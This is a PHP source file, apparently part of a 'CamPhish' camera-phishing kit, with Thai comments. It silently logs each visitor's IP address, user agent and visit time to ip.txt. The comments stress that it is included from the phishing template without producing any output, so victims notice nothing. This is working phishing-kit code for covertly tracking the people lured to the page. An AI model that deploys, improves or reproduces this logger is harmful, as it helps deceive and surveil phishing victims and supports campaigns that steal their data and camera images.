<?php
// CamPhish Modder v3.0 - ip logger (stable, silent include)
// หมายเหตุ: ไฟล์นี้ถูก include จาก template.php ต้องเงียบ (ห้าม echo) เพื่อไม่ให้ HTML เพี้ยน

function modder_get_ip() {
    $candidates = [];
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        $candidates[] = $_SERVER['HTTP_CLIENT_IP'];
    }
    if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        // X-Forwarded-For อาจมีหลาย IP คั่นด้วย comma — เอาตัวแรก
        foreach (explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']) as $f) {
            $candidates[] = trim($f);
        }
    }
    if (!empty($_SERVER['REMOTE_ADDR'])) {
        $candidates[] = $_SERVER['REMOTE_ADDR'];
    }
    foreach ($candidates as $c) {
        $c = trim($c);
        // ตัดพอร์ต/อักขระแปลกๆ จำกัดความยาวกัน log injection
        $c = substr(preg_replace('/[^0-9a-fA-F\.\:]/', '', $c), 0, 45);
        if ($c !== '' && filter_var($c, FILTER_VALIDATE_IP)) {
            return $c;
        }
    }
    // fallback: คืนค่าดิบที่ sanitize แล้ว (กรณี IP แปลก)
    $raw = isset($_SERVER['REMOTE_ADDR']) ? $_SERVER['REMOTE_ADDR'] : 'Unknown';
    return substr(preg_replace('/[\r\n]+/', ' ', (string)$raw), 0, 45);
}

$ipaddress = modder_get_ip();
$browser = isset($_SERVER['HTTP_USER_AGENT']) ? substr((string)$_SERVER['HTTP_USER_AGENT'], 0, 300) : 'Unknown';
$browser = str_replace(["\r", "\n"], ' ', $browser);
$date = date('Y-m-d H:i:s');

$entry = "IP: " . $ipaddress . "\r\n"
       . "Date: " . $date . "\r\n"
       . "User-Agent: " . $browser . "\r\n\r\n";

// ใช้ LOCK_EX กันไฟล์เสียเวลา request ชนกัน, ไม่ echo ใดๆ (silent)
@file_put_contents('ip.txt', $entry, LOCK_EX);
